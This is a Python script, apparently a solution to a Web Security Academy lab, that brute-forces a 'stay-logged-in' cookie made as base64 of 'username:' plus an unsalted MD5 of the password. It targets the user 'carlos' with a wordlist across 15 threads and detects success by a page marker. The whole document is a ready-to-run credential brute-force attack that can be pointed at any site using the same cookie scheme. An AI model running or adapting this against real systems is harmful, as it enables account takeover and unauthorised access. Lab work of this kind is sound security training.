
"""
Brute-forcing a stay-logged-in cookie.

Cookie format confirmed: base64("username:" + MD5(password))
No salt involved - verified by matching wiener's known password (peter)
against the MD5 hash inside wiener's cookie.

For each password candidate:
  1. Compute MD5(password)
  2. Build cookie = base64("carlos:" + md5hash)
  3. Send as stay-logged-in cookie to /my-account
  4. Success marker: "Your username" appears in the response body
     (this phrase is username-agnostic, confirmed against wiener's
     real account page first)
"""

import base64
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

TARGET = "https://0aa6003803b53d11800d491000340002.web-security-academy.net"
TARGET_USER = "carlos"
WORDLIST_PATH = "passwords.txt"
SUCCESS_MARKER = "Your username"
WORKERS = 15

found_event = threading.Event()
found_password = None


def build_cookie(username: str, password: str) -> str:
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    raw = f"{username}:{md5_hash}"
    return base64.b64encode(raw.encode()).decode()


def try_password(password: str):
    if found_event.is_set():
        return None

    cookie_value = build_cookie(TARGET_USER, password)

    session = requests.Session()
    session.cookies.set("stay-logged-in", cookie_value)

    resp = session.get(f"{TARGET}/my-account", allow_redirects=False)

    if resp.status_code == 200 and SUCCESS_MARKER in resp.text:
        return password
    return None


def main():
    global found_password

    with open(WORDLIST_PATH) as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} candidate passwords")

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(try_password, pw): pw for pw in passwords}

        for future in as_completed(futures):
            result = future.result()
            if result:
                found_password = result
                found_event.set()
                print(f"[+] Found password for {TARGET_USER}: {found_password}")
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_password:
        print(f"[-] No matching password found in wordlist for {TARGET_USER}")
    else:
        cookie = build_cookie(TARGET_USER, found_password)
        print(f"[+] Working stay-logged-in cookie: {cookie}")


if __name__ == "__main__":
    main()